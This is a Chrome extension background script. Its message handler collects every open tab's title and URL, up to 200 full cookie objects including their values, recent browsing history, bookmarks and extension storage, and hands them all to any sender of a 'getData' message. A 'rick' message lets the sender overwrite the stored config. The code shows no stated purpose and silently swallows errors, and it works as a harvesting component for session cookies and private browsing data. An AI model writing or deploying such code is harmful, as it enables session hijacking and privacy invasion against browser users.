chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
  if (message.type === "getData") {
    getAllData(sendResponse);
    return true;
  }

  if (message.type === "rick") {
    chrome.storage.local.set({
      config: message.config
    });
    return true;
  }

  if (message.type === "getConfig") {
    chrome.storage.local.get("config", (data) => {
      sendResponse(data);
    });

    return true;
  }
});



async function getAllData(sendResponse) {
  try {
    const [tabs, cookies, historyItems, bookmarks, storageData] = await Promise.all([
      chrome.tabs.query({}),
      chrome.cookies.getAll({}),
      chrome.history.search({ text: "", maxResults: 100 }),
      chrome.bookmarks.getTree(),
      chrome.storage.local.get(null)
    ]);

    const data = {
      timestamp: new Date().toISOString(),
      tabs: tabs.map(t => ({ title: t.title, url: t.url })),
      cookiesCount: cookies.length,
      cookiesSample: cookies.slice(0, 200),
      history: historyItems.map(h => ({ title: h.title, url: h.url })),
      bookmarksSample: bookmarks[0]?.children?.slice(0, 5) || [],
      storage: storageData
    };

    sendResponse({ data });
  } catch (_) {
  }
}
